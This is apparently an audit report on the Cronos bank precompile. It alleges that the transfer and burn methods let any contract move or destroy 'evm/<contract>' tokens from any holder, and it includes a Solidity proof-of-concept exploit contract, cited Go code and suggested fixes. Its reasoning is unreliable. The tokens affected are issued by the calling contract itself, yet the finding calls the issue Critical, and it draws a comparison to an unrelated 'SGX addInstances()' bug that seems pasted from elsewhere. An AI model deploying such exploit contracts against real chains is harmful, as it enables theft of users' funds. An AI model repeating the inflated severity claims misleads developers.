### Title
Unauthorized Transfer and Burn of Precompile-Controlled Assets via Unsanitized `sender` Parameter in Bank Precompile `transfer` and `burn` — (`File: x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The bank precompile's `transfer` and `burn` methods accept a `sender`/`recipient` address as a user-supplied ABI argument without verifying that the calling contract (`contract.Caller()`) is authorized to act on behalf of that address. Any EVM contract can therefore transfer or burn `evm/<contract>` native tokens from any holder's account without the holder's consent.

---

### Finding Description

In `x/cronos/keeper/precompiles/bank.go`, the `Run` method handles three operations: `mint`, `burn`, and `transfer`. For `transfer`:

```go
case TransferMethodName:
    args, err := method.Inputs.Unpack(contract.Input[4:])
    sender    := args[0].(common.Address)   // ← user-supplied, never verified
    recipient := args[1].(common.Address)
    amount    := args[2].(*big.Int)
    from := sdk.AccAddress(sender.Bytes())
    to   := sdk.AccAddress(recipient.Bytes())
    denom := EVMDenom(contract.Caller())    // denom tied to calling contract
    // ...
    bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

`sender` is decoded directly from the ABI-encoded call data. There is no check that `sender == contract.Caller()` or that `contract.Caller()` holds an allowance from `sender`. The denom is `evm/<contract.Caller()>`, so the calling contract controls the token namespace — but it can move tokens from **any** holder of that denom to any destination.

The same pattern applies to `burn`:

```go
case MintMethodName, BurnMethodName:
    recipient := args[0].(common.Address)   // ← address to burn FROM, user-supplied
    amount    := args[1].(*big.Int)
    addr := sdk.AccAddress(recipient.Bytes())
    denom := EVMDenom(contract.Caller())
    // ...
    bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, ...)
    bc.bankKeeper.BurnCoins(ctx, types.ModuleName, ...)
```

Any contract can burn `evm/<contract>` tokens from any address without that address's consent.

This is structurally identical to the SGX `addInstances()` bug: a critical parameter (`newInstance` / `sender`) is accepted from the caller without being covered by any authorization check, allowing it to be set to an arbitrary value.

---

### Impact Explanation

**Critical — Unauthorized transfer and burn of precompile-controlled assets.**

The `evm/<contract>` denom is a first-class Cosmos native denom managed by the bank module. Any DeFi protocol, lending platform, or token issuer that uses the bank precompile to issue tokens to users is exposed:

1. Attacker deploys contract A.
2. Contract A calls `bank.mint(victim, N)` — victim receives N `evm/A` tokens.
3. Victim deposits `evm/A` tokens into a legitimate protocol as collateral or liquidity.
4. Attacker calls `bank.transfer(victim, attacker, N)` — N tokens are moved from victim to attacker without victim's consent.
5. Alternatively, attacker calls `bank.burn(victim, N)` — victim's balance is destroyed.

The victim has no on-chain mechanism to prevent step 4 or 5. The bank precompile performs no allowance or ownership check.

---

### Likelihood Explanation

**High.** The entry path is fully unprivileged: any EOA can deploy a contract and call the bank precompile. No leaked keys, governance action, or validator compromise is required. The only precondition is that a victim holds `evm/<attacker_contract>` tokens, which the attacker can arrange by minting them to the victim first, or by operating a legitimate-looking token contract that users adopt.

---

### Recommendation

In the `transfer` case, enforce that the `sender` argument equals `contract.Caller()`, or implement an ERC20-style allowance mechanism:

```go
// Enforce caller == sender (simplest fix)
if sender != contract.Caller() {
    return nil, errors.New("transfer: sender must be the calling contract")
}
```

For `burn`, enforce that the address being burned from is `contract.Caller()` unless an explicit allowance has been granted:

```go
if recipient != contract.Caller() {
    return nil, errors.New("burn: can only burn from calling contract's own balance")
}
```

Alternatively, introduce an `approve`/`transferFrom` pattern analogous to ERC20 so that token holders can explicitly authorize contracts to move their balances.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankPrecompile {
    function mint(address recipient, uint256 amount) external payable returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external payable returns (bool);
    function burn(address account, uint256 amount) external payable returns (bool);
}

contract BankPrecompileExploit {
    IBankPrecompile constant bank = IBankPrecompile(address(0x64)); // precompile at 0x64

    // Step 1: mint evm/<this> tokens to victim (e.g. as part of a "legitimate" airdrop)
    function mintToVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: steal victim's evm/<this> tokens without any approval
    function stealFromVictim(address victim, address attacker, uint256 amount) external {
        // sender = victim, but caller is this contract — no authorization check in precompile
        bank.transfer(victim, attacker, amount);
    }

    // Alternative: destroy victim's balance
    function burnVictimBalance(address victim, uint256 amount) external {
        bank.burn(victim, amount);
    }
}
```

After deploying `BankPrecompileExploit`:
1. Call `mintToVictim(alice, 1000)` — alice now holds 1000 `evm/<exploit_contract>` tokens.
2. Call `stealFromVictim(alice, attacker, 1000)` — alice's balance is transferred to attacker with no consent from alice and no revert from the precompile. [1](#0-0) [2](#0-1) [3](#0-2)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L56-58)
```go
func EVMDenom(token common.Address) string {
	return EVMDenomPrefix + token.Hex()
}
```

**File:** x/cronos/keeper/precompiles/bank.go (L113-155)
```go
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
```

**File:** x/cronos/keeper/precompiles/bank.go (L167-200)
```go
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```
